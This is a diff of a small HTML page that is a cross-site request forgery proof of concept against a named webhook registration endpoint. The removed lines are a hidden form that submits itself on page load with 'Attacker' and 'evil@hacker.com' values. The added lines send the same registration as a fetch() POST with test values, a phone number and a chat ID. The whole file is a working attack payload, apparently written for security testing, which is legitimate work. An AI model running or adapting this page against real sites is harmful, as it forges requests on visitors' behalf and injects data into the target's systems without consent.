@@ -1,16 +1,20 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <form id="csrfForm" action="https://n8ntest.qamal.org/webhook/registration" method="POST" enctype="application/json">
-  <input type="hidden" name="chatId" value="1185306175" />
-  <input type="hidden" name="firstName" value="Attacker" />
-  <input type="hidden" name="lastName" value="Injected" />
-  <input type="hidden" name="phone" value="++77053420022" />
-  <input type="hidden" name="email" value="evil@hacker.com" />
-</form>
-<script>
-  // Auto-submit the form when the victim visits the page
-  document.forms[0].submit();
-</script>
+    <script>
+      fetch("https://n8ntest.qamal.org/webhook/registration", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          firstName: "CSRF",
+          lastName: "Test",
+          phone: "+77053420022",
+          email: "csrf@example.com",
+          chatId: "1185306175"
+        })
+      });
+    </script>
   </body>
 </html>
